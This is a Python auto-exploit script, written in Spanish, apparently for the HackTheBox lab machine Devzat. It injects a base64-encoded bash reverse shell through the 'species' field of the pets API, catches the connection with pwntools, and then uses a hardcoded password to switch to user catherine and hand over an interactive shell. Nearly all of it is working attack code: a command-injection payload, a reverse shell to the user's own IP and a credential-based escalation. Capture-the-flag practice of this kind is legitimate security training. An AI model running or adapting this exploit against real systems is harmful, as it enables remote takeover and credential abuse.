import base64
from colorama import init, Fore, Style
import requests
import time
import os
import sys


print(f'''{Fore.MAGENTA}   _                            _                 _      _ _  _   ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}  (_) __ _  __ _  __ _  ___  __| |_ __ ___  _   _| | ___/ | || |  ''')
time.sleep(0.1)
print(f'''{Fore.BLUE}  | |/ _` |/ _` |/ _` |/ _ \/ _` | '_ ` _ \| | | | |/ _ \ | || |_ ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}  | | (_| | (_| | (_| |  __/ (_| | | | | | | |_| | |  __/ |__   _|''')
time.sleep(0.1)
print(f'''{Fore.MAGENTA} _/ |\__,_|\__, |\__, |\___|\__,_|_| |_| |_|\__,_|_|\___|_|  |_|  ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}|__/       |___/ |___/                                            ''')
time.sleep(0.1)

print(f'\n{Fore.BLUE}JAGGEDMULE14 - DEVZAT HACKTHEBOX AUTOPWN')
time.sleep(0.5)
print(f'{Fore.CYAN}NO OLVIDES CORRER EL SCRIPT COMO ROOT\n')

ip = input(f'{Fore.MAGENTA}Introduce tu IP (tun0): ')
port = int(input(f'{Fore.CYAN}Puerto con el que quieras romper la mamona: '))
from pwn import *

def def_handler(sig, frame):
    print(f'{Fore.CYAN}[-]Exit')
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def ping(host):
    ping = os.system(f'ping -c 1 {host} >/dev/null 2>&1')
    if ping == 0:
        return True
    else:
        return False

if os.system("echo '10.10.11.118    devzat.htb pets.devzat.htb' >> /etc/hosts") == 0:
    if ping('devzat.htb') == True:
        print(f'\n{Fore.BLUE}[+]Conexión exitosa')
        time.sleep(0.5)
        dev = requests.get('http://devzat.htb')
        pet = requests.get('http://pets.devzat.htb')
        
        if dev.status_code and pet.status_code == 200:
            def shellcon():
                message = f'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"'
                message_bytes = message.encode('ascii')
                base64_bytes = base64.b64encode(message_bytes)
                base64_message = base64_bytes.decode('ascii')
                print(f'{Fore.CYAN}[+]Base64 command "{base64_message}"')
                print(f"{Fore.MAGENTA}[+]HTTP/{dev.status_code} OK")
                time.sleep(0.5)
                print(f'{Fore.CYAN}[+]Obteniendo shell como Patrick')
                sdata = {"name":"pito","species":f"cat; echo -n {base64_message} | base64 -d | bash"}
                url = 'http://pets.devzat.htb/api/pet'
                head = {'Host' : 'pets.devzat.htb', 'Origin' : 'http://pets.devzat.htb', 'Referer' : 'http://pets.devzat.htb/'}
                requests.post(url, json=sdata, headers=head)
            try:
                threading.Thread(target=shellcon).start()
            except Exception as e:
                print(f'[-]{e}')
            shellc = listen(port, timeout=5).wait_for_connection()
            if shellc.sock is None:
                print(f'{Fore.RED}[-]Conexión fallida')
                sys.exit(1)
            else:
                time.sleep(0.5)
                print(f'{Fore.BLUE}[+]Inyección de comandos exitosa')
            shellc.sendline('su catherine')
            shellc.sendline('woBeeYareedahc7Oogeephies7Aiseci')
            shellc.sendline()
            time.sleep(0.5)
            print(f'{Fore.CYAN}[+]Shell como Catherine exitosa')
            shellc.sendline('export TERM=xterm')
            print(f'{Fore.CYAN}\n\n[!]PRESIONA ENTER Y DISFRUTA DE LA SHELL\n\n')
            shellc.interactive()
            
        else:
            print(f"{Fore.RED}[-]HTTP/{dev.status_code}")
            time.sleep(0.5)
            print(f"{Fore.RED}[-]Algo salió mal comprueba la conectividad con la máquina")
            sys.exit(1)
    else:
        print(f'{Fore.RED}[-]Nos fuimos a la verga')
        time.sleep(0.5)
        print(f'{Fore.RED}[-]Conexión con la máquina fallida')
        time.sleep(0.5)
        print(f'{Fore.RED}[-]La máquina está activa?')
        time.sleep(0.5)
        print(f'{Fore.RED}[-]Intenta correr el script de nuevo\n')
        sys.exit(1)
else:
    print(f'{Fore.RED}[-]¿Corriste este script como root?')
    sys.exit(1)